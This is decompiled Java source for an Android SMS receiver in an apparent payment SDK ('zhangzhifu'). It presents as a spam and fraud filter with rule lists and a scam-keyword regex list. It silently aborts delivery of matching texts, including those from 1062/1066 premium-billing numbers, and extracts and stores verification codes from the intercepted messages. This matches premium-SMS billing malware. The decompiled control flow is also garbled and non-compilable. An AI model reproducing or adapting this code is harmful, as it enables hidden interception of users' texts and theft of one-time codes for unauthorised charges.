package com.zhangzhifu.sdk.util.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager.WakeLock;
import android.telephony.SmsMessage;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.util.sms.database.DbAdapter;
import com.zhangzhifu.sdk.util.sms.database.ReadRules;
import com.zhangzhifu.sdk.util.sms.util.MessageUtils;
import com.zhangzhifu.sdk.util.sms.util.SmsAuthCode;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver
  extends BroadcastReceiver
{
  static final Object fb = new Object();
  static PowerManager.WakeLock fc = null;
  private static SmsReceiver fd = null;
  private static String ff;
  private static String fg;
  private static long fh;
  private static long fi;
  private static boolean fl = true;
  private static boolean fm = false;
  private static boolean fn = true;
  private static boolean fo = true;
  private String MCC;
  private DbAdapter cV = null;
  private StringBuilder eW = new StringBuilder();
  private String eX = null;
  private long eY;
  private String eZ;
  private String fa;
  private final String fe = "system.sms.authcode";
  private HashMap fj = new HashMap();
  private String fk;
  
  public SmsReceiver() {}
  
  private boolean H(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getPhoneContacts(paramContext, this.MCC);
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      if (arrayOfString[i] != null) {}
      try
      {
        if (Pattern.matches(arrayOfString[i], this.eZ))
        {
          this.cV = null;
          p(paramContext, "000");
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "004");
      }
    }
    return false;
  }
  
  private boolean I(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.cV, "type= 4");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (arrayOfString[i].contains("*")) {
          arrayOfString[i] = arrayOfString[i].replaceAll("\\*", ".*");
        }
        if (c(arrayOfString[i], this.fa))
        {
          n(paramContext, "[自定白关键词] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "006");
      }
    }
    return false;
  }
  
  private boolean J(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesNumbers(this.cV, "type= 0", this.MCC);
    int j = arrayOfString.length;
    StringBuilder localStringBuilder = new StringBuilder();
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        localStringBuilder.append(arrayOfString[i].replaceAll("\\?", ".").replaceAll("\\*", ".*"));
        if (Pattern.matches(localStringBuilder.toString(), this.eZ))
        {
          m(paramContext, "[自定黑号码]" + arrayOfString[i]);
          return true;
        }
        localStringBuilder.delete(0, localStringBuilder.length());
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "008");
      }
    }
    return false;
  }
  
  private boolean K(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.cV, "type=8");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (c(arrayOfString[i], this.fa))
        {
          m(paramContext, "[自定黑词] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "009");
      }
    }
    return false;
  }
  
  private boolean L(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.cV, "type='6'");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (Pattern.matches(arrayOfString[i], this.fa))
        {
          m(paramContext, "[正则式] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "010");
      }
    }
    return false;
  }
  
  private boolean M(Context paramContext)
  {
    String[] arrayOfString;
    int j;
    int i;
    if (fn)
    {
      arrayOfString = ReadRules.getRulesNumbers(this.cV, "type= 7", this.MCC);
      j = arrayOfString.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (arrayOfString[i].contains("?")) {
          arrayOfString[i] = arrayOfString[i].replaceAll("\\?", ".");
        }
        while (Pattern.matches(arrayOfString[i], this.eZ))
        {
          n(paramContext, "[内置白号码] " + arrayOfString[i]);
          return true;
          if (arrayOfString[i].contains("*")) {
            arrayOfString[i] = arrayOfString[i].replaceAll("\\*", ".*");
          }
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "011");
        return false;
      }
    }
  }
  
  private boolean N(Context paramContext)
  {
    String[] arrayOfString;
    int j;
    int i;
    if (fo)
    {
      arrayOfString = ReadRules.getRulesStrings(this.cV, "type='3'");
      j = arrayOfString.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (c(arrayOfString[i], this.fa))
        {
          m(paramContext, "[内置黑词] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "012");
      }
    }
    return false;
  }
  
  private boolean c(Context paramContext, boolean paramBoolean)
  {
    String[] arrayOfString2 = ReadRules.getRulesNumbers(this.cV, "type= 1", this.MCC);
    String[] arrayOfString1 = arrayOfString2;
    if (paramBoolean)
    {
      arrayOfString1 = arrayOfString2;
      if (fn) {
        arrayOfString1 = concat(arrayOfString2, ReadRules.getRulesNumbers(this.cV, "type= 7", this.MCC));
      }
    }
    int j = arrayOfString1.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (arrayOfString1[i].contains("?")) {
          arrayOfString1[i] = arrayOfString1[i].replaceAll("\\?", ".");
        }
        while (Pattern.matches(arrayOfString1[i], this.eZ))
        {
          n(paramContext, "[白号码] " + arrayOfString1[i]);
          return true;
          if (arrayOfString1[i].contains("*")) {
            arrayOfString1[i] = arrayOfString1[i].replaceAll("\\*", ".*");
          }
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        q(paramContext, "005");
        return false;
      }
    }
  }
  
  private static boolean c(String paramString1, String paramString2)
  {
    paramString1 = Pattern.compile(paramString1).matcher(paramString2);
    if (paramString1.find()) {
      return true;
    }
    paramString1.reset();
    return false;
  }
  
  public static String[] concat(String[] paramArrayOfString1, String[] paramArrayOfString2)
  {
    if (paramArrayOfString1.length == 0) {
      return paramArrayOfString2;
    }
    if (paramArrayOfString2.length == 0) {
      return paramArrayOfString1;
    }
    String[] arrayOfString = new String[paramArrayOfString1.length + paramArrayOfString2.length];
    System.arraycopy(paramArrayOfString1, 0, arrayOfString, 0, paramArrayOfString1.length);
    System.arraycopy(paramArrayOfString2, 0, arrayOfString, paramArrayOfString1.length, paramArrayOfString2.length);
    return arrayOfString;
  }
  
  public static SmsReceiver getInstance()
  {
    if (fd == null) {
      fd = new SmsReceiver();
    }
    return fd;
  }
  
  private void m(Context paramContext, String paramString)
  {
    abortBroadcast();
    long l = this.cV.createOne(this.eX, this.eW.toString(), this.eY, paramString);
    MessageUtils.writeUnreadCountSharedPreferences(paramContext, MessageUtils.readUnreadCountSharedPreferences(paramContext) + 1);
    MessageUtils.writeStringSharedPreferences(paramContext, "blockedcount", Long.valueOf(l).toString());
    this.cV = new DbAdapter(paramContext);
    if (this.cV != null) {}
    for (;;)
    {
      try
      {
        this.fj = this.cV.Query(paramContext);
        fg = (String)this.fj.get("dbSMS_Body");
        System.out.println("=================dbSMS_Body =" + fg);
        if ((fi == 0L) || (fh == 0L)) {
          break label281;
        }
        if (w() != 1) {
          break label256;
        }
        System.out.println();
        this.fk = SmsAuthCode.getDynamicPassword(paramContext, fg);
        SharePreferUtil.getInstance().setAuthCode(paramContext, this.fk);
        System.out.println("最终的验证码---》" + SharePreferUtil.getInstance().getAuthCode(paramContext));
        this.eW.delete(0, this.eW.length());
        p(paramContext, "000");
        return;
      }
      catch (NumberFormatException paramString)
      {
        paramString.printStackTrace();
        System.out.println("拦截信箱里无该数据");
        continue;
      }
      System.out.println("=================mDbAdapter === null");
      continue;
      label256:
      if (w() == 2)
      {
        label281:
        do
        {
          this.fk = SmsAuthCode.getDynamicPassword(paramContext, this.eW.toString());
          break;
        } while ((fi == 0L) || (fh != 0L));
        this.fk = SmsAuthCode.getDynamicPassword(paramContext, fg);
      }
    }
  }
  
  private void n(Context paramContext, String paramString)
  {
    this.cV.createAllowOne(this.eX, this.eY, paramString);
    this.cV = null;
    this.eW.delete(0, this.eW.length());
    p(paramContext, "000");
  }
  
  private boolean o(Context paramContext, String paramString)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.cV, "type=5");
    int j = arrayOfString.length;
    paramString = Integer.toString(paramString.length());
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (paramString.equals(arrayOfString[i]))
        {
          m(paramContext, "[自定匹配位数] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException paramString)
      {
        paramString.printStackTrace();
        q(paramContext, "007");
      }
    }
    return false;
  }
  
  private static void p(Context paramContext, String paramString)
  {
    MessageUtils.writeStringSharedPreferences(paramContext, "ErrorCode", paramString);
  }
  
  private static void q(Context paramContext, String paramString)
  {
    MessageUtils.writeStringSharedPreferences(paramContext, "ErrorCode", paramString);
  }
  
  private static int w()
  {
    if (fi > fh) {
      return 1;
    }
    return 2;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int i;
    int j;
    try
    {
      if (!paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
        break label85;
      }
      arrayOfObject = (Object[])paramIntent.getExtras().get("pdus");
      arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
      if (arrayOfSmsMessage.equals("")) {
        break label85;
      }
      i = 0;
    }
    catch (Exception localException)
    {
      try
      {
        for (;;)
        {
          SmsMessage[] arrayOfSmsMessage;
          label85:
          ff = paramIntent.getStringExtra("sysSMS_Body");
          fh = paramIntent.getLongExtra("sysSMS_Time", 1111L);
          p(paramContext, "103");
          this.cV = null;
          this.cV = new DbAdapter(paramContext);
          this.MCC = MessageUtils.fetchMCC(paramContext);
          this.eZ = this.eX;
          if (this.eZ.startsWith(this.MCC)) {
            this.eZ = this.eZ.substring(this.MCC.length());
          }
          p(paramContext, "105");
          this.fa = this.eW.toString().replaceAll("\\s", "").toLowerCase();
          if ((!fl) && (fm)) {
            break label424;
          }
          System.out.println("onlycontactwhite" + fl);
          System.out.println("period" + fm);
          p(paramContext, "106");
          if (!H(paramContext)) {
            break;
          }
          return;
          arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
          i += 1;
          continue;
          Object[] arrayOfObject = arrayOfSmsMessage[i];
          this.eW.append(arrayOfObject.getMessageBody());
          this.eX = arrayOfObject.getOriginatingAddress();
          this.eY = arrayOfObject.getTimestampMillis();
          i += 1;
        }
        localException = localException;
        localException.printStackTrace();
      }
      catch (Exception paramIntent)
      {
        label424:
        do
        {
          do
          {
            do
            {
              do
              {
                do
                {
                  do
                  {
                    do
                    {
                      for (;;)
                      {
                        paramIntent.printStackTrace();
                        System.out.println("系统信箱中未查到该信息");
                      }
                      if (!fl) {
                        break;
                      }
                    } while ((c(paramContext, true)) || (I(paramContext)));
                    m(paramContext, "[仅放行联系人和白名单]");
                    return;
                    p(paramContext, "109");
                  } while (c(paramContext, false));
                  p(paramContext, "110");
                } while (I(paramContext));
                p(paramContext, "111");
              } while (o(paramContext, this.eZ));
              p(paramContext, "112");
            } while (J(paramContext));
            p(paramContext, "113");
          } while (K(paramContext));
          p(paramContext, "114");
        } while ((H(paramContext)) || (L(paramContext)) || (M(paramContext)));
        if ((!Pattern.matches("1062.*", this.eZ)) && (!Pattern.matches("1066.*", this.eZ))) {
          break label570;
        }
        m(paramContext, "[收费业务]");
        return;
        label570:
        paramIntent = new String[19];
        paramIntent[0] = ".*账号.*";
        paramIntent[1] = ".*账户.*";
        paramIntent[2] = ".*汇[^\\p{P}]*钱.*";
        paramIntent[3] = ".*钱[^\\p{P}]*汇.*";
        paramIntent[4] = ".*打[^\\p{P}]*钱.*";
        paramIntent[5] = ".*钱[^\\p{P}]*打.*";
        paramIntent[6] = ".*汇[^\\p{P}]*款.*";
        paramIntent[7] = ".*款[^\\p{P}]*汇.*";
        paramIntent[8] = ".*打[^\\p{P}]*款.*";
        paramIntent[9] = ".*款[^\\p{P}]*打.*";
        paramIntent[10] = ".*存[^\\p{P}]*款.*";
        paramIntent[11] = ".*款[^\\p{P}]*存.*";
        paramIntent[12] = ".*邮政.*包裹.*";
        paramIntent[13] = ".*包裹.*邮政.*";
        paramIntent[14] = ".*机.*幸运.*码.*";
        paramIntent[15] = ".*机号.*幸运.*";
        paramIntent[16] = ".*通知.*违章.*联系.*";
        paramIntent[17] = ".*银行[】\\]\\.\\。]*\\w{0,3}";
        paramIntent[18] = ".*[【\\[].?行[】\\]]*\\w{0,3}";
        j = paramIntent.length;
        i = 0;
      }
    }
    if (i >= arrayOfObject.length)
    {
      this.eW.delete(0, this.eW.length());
      j = arrayOfSmsMessage.length;
      i = 0;
      if ((i >= j) && (!paramIntent.getAction().equals("system.sms.authcode"))) {}
    }
    for (;;)
    {
      if (i >= j) {}
      while (!N(paramContext))
      {
        n(paramContext, "[没有规则]");
        return;
        try
        {
          if ((!Pattern.matches(paramIntent[i], this.fa)) || (this.eZ.length() != 11)) {
            break label781;
          }
          m(paramContext, "[可疑诈骗]");
          return;
        }
        catch (RuntimeException paramIntent)
        {
          paramIntent.printStackTrace();
          q(paramContext, "003");
        }
      }
      continue;
      label781:
      i += 1;
    }
  }
  
  protected void onReceiveWithPrivilege(Context paramContext, Intent paramIntent, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))) {
      return;
    }
    paramIntent.setClass(paramContext, SmsReceiverService.class);
    paramIntent.putExtra("result", getResultCode());
  }
}
